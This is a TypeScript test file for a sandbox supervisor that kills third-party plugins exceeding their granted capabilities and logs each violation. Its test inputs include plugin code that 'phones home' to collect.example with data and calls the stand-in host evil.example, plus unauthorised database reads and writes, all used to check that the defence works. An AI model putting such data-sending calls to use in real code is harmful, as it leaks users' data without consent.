/*
 * Agamemnon — AI-agent write-path guardian
 * Copyright (c) 2026 Elamaran Elangovan. All rights reserved.
 *
 * Proprietary and confidential. No licence is granted to use, copy, modify,
 * distribute, or run this software beyond local evaluation of this repository
 * as published. See LICENSE at the repository root.
 *
 * ref: AGMN-BOZW-F6BTKX-X3LAO
 */

import { describe, it, expect } from "vitest";
import { SandboxSupervisor } from "../supervisor.ts";
import { FakeBridge, fakeFetch, sandbox } from "./fakes.ts";
import type { CapabilityFlag } from "../types.ts";

/**
 * Use case 3 — third-party plugins. They get exactly the capabilities they
 * were granted. Any attempt beyond that kills the plugin on the spot, records
 * a violation (and writes it to the broker's audit log), and the sandbox
 * stays dead.
 */
describe("use case: third-party plugin runtime", () => {
  const breaches: Array<[string, CapabilityFlag[], string]> = [
    ["a read-only plugin that writes", ["READ_ONLY"], `await db.insert("orders", { x: 1 });`],
    ["a write-only plugin that reads", ["MUTATE_STATE"], `await db.select("customers");`],
    ["an offline plugin that phones home", ["READ_ONLY"], `await api.fetch("https://collect.example/?d=1");`],
    ["a networked plugin that leaves its allowlist", ["EXTERNAL_HTTP"], `await api.fetch("https://evil.example/");`],
    ["a plugin that messages other agents", ["READ_ONLY"], `await agents.send("sb-x", "hi");`],
  ];

  it.each(breaches)("kills %s and logs the violation", async (_why, grants, code) => {
    const bridge = new FakeBridge();
    const f = fakeFetch(() => ({ body: "x" }));
    const sup = new SandboxSupervisor({ bridge, fetch: f.impl });
    const id = await sup.spawnSandbox(sandbox(grants, { allowedDomains: ["rates.example"] }));
    const r = await sup.executeInSandbox(id, `${code}\nreturn "got through";`, {});
    expect(r.success).toBe(false);
    expect(r.killed).toMatch(/policy violation/);
    expect(sup.violations()).toHaveLength(1);
    expect(sup.status(id).status).toBe("terminated");
    await Promise.resolve();
    expect(bridge.violations).toHaveLength(1); // persisted via the bridge (the broker's audit log)
    expect(bridge.writes).toEqual([]);
    expect(f.calls).toEqual([]);
  });

  it("a granted plugin works, and stays alive across runs", async () => {
    const bridge = new FakeBridge();
    const f = fakeFetch(() => ({ body: '{"cents":495}', headers: { "content-type": "application/json" } }));
    const sup = new SandboxSupervisor({ bridge, fetch: f.impl });
    const id = await sup.spawnSandbox(sandbox(["EXTERNAL_HTTP", "MUTATE_STATE"], { allowedDomains: ["rates.example"] }));
    for (const zip of ["94110", "10001"]) {
      const r = await sup.executeInSandbox(id, `const q = await api.fetch("https://rates.example/v1?zip=" + context.zip); await db.insert("quotes", { zip: context.zip, cents: JSON.parse(q.body).cents }); return "ok";`, { zip });
      expect(r.data).toBe("ok");
    }
    expect(sup.status(id).status).toBe("ready");
    expect(bridge.writes.map((w) => w.mutation.data)).toEqual([
      { zip: "94110", cents: 495 },
      { zip: "10001", cents: 495 },
    ]);
  });

  it("a killed plugin's later code never runs, even code already queued", async () => {
    const bridge = new FakeBridge();
    const sup = new SandboxSupervisor({ bridge });
    const id = await sup.spawnSandbox(sandbox(["MUTATE_STATE"]));
    const r = await sup.executeInSandbox(
      id,
      `const pending = [db.insert("a", { n: 1 }), api.fetch("https://evil.example/"), db.insert("b", { n: 2 })];
       await Promise.allSettled(pending);
       await db.insert("c", { n: 3 });
       return "survived";`,
      {},
    );
    expect(r.killed).toMatch(/policy violation/);
    expect(bridge.writes.map((w) => w.mutation.table)).not.toContain("c");
  });
});
